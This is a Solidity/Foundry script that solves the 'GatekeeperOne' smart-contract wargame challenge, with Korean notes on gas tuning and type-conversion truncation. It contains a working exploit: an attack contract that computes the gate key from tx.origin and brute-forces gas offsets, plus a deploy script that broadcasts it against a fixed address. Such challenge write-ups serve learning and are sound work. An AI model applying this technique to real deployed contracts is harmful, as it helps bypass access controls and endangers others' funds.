// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperOne.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackGatekeeperOne {
    GatekeeperOne public victimInstance;

    constructor(address _victimAddress) {
        victimInstance = GatekeeperOne(_victimAddress);
    }
    
    function attack() public {
        /*for (uint i = 0; i < 8191; i++) {
            (bool success, ) = _victimAddress.call{gas: 82910 + i}(
                abi.encodeWithSignature("enter(bytes8)", _key)
            );
            if (success) {
                break;
            }
        }*/


       bytes2 last2Bytes = bytes2(uint16(uint160(tx.origin)));
       uint64 lastBits_uint = uint64(uint16(last2Bytes));
       uint64 highBits_uint = uint64(1) << 32;
       bytes8 gateKey = bytes8(highBits_uint + lastBits_uint);

       for (uint256 i = 0; i < 120; i++ ) {
        (bool success, ) = address(victimInstance).call{gas: i + 150 + 8191 * 3}(
            abi.encodeWithSignature("enter(bytes8)", gateKey)
        );
        if (success) {
            break;
        }
       }
    }
}

contract GatekeeperOneSolution is Script {
    GatekeeperOne victimInstance = GatekeeperOne(0x535173CbE8494Cf060E513949076fFa9954e5b34);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackGatekeeperOne attacker = new AttackGatekeeperOne(address(victimInstance)); 
        attacker.attack();
        vm.stopBroadcast();
    }
}
// 처음에 for문으로 시도했으나 온체인에서 받아들일 수 있는 가스를 넘어버려서 에러 발생함. 그래서 각 함수마다 가스비 사용량을 알아보니 대충 8191*3 + 150 주변이어서 그렇게 값을 조정하고 다시 시도
// Privacy 문제에서는 bytes32를 bytes16으로 형 변환할 때 값의 앞부분을 사용했지만 이 문제에서는 뒷 부분을 사용함
// 이는 Solidity가 타입에 따라 형 변환을 다르게 처리하기 때문인데 bytes -> bytes는 뒤쫏을 버리고 uint -> uint는 앞쪽을 버린다